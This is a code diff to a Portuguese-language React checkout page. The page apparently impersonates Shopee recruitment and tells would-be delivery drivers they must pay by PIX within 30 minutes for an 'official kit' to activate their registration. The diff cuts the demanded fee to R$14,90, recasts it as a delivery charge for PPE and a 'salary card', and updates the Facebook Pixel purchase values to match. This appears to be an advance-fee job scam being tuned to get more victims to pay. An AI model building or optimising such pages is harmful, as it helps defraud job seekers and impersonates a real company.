@@ -559,7 +559,7 @@ const Entrega: React.FC = () => {
         content_name: 'Kit de Segurança Shopee',
         content_ids: [pixData.id],
         content_type: 'product',
-        value: 74.90,
+        value: 14.90,
         currency: 'BRL'
       });
       
@@ -767,7 +767,7 @@ const Entrega: React.FC = () => {
           console.log('[ENTREGA] 🎉 Pagamento APROVADO! Redirecionando...');
           
           // Rastrear o evento de compra no Facebook Pixel
-          trackPurchase(paymentId, 74.90);
+          trackPurchase(paymentId, 14.90);
           
           // Exibir mensagem de sucesso para o usuário
           toast({
@@ -1083,8 +1083,8 @@ const Entrega: React.FC = () => {
                     <div>
                       <h4 className="text-sm font-medium text-[#E83D22]">Informação Importante:</h4>
                       <p className="text-sm text-gray-700">
-                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatório a aquisição do 
-                        Kit Oficial de Entregador da Shopee. O kit é entregue a preço de custo por <strong>R$64,90</strong>.
+                        Para ativar seu cadastro e se tornar um entregador Shopee, é obrigatória a aquisição do 
+                        Kit Oficial de Entregador da Shopee e do Cartão Salário. A taxa de entrega do EPI e do Cartão Salário é de <strong>R$14,90</strong>.
                       </p>
                     </div>
                   </div>
@@ -1103,8 +1103,8 @@ const Entrega: React.FC = () => {
                     <div>
                       <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
                       <p className="text-red-700 text-sm mt-1">
-                        O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
-                        adquirir este kit oficial para exercer a função de entregador Shopee.
+                        O pagamento da taxa de entrega do EPI e do Cartão Salário no valor de <strong>R$14,90</strong> é <strong>obrigatório</strong> e você precisa 
+                        realizar este pagamento para exercer a função de entregador Shopee.
                       </p>
                       <p className="text-red-700 text-sm mt-2">
                         Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
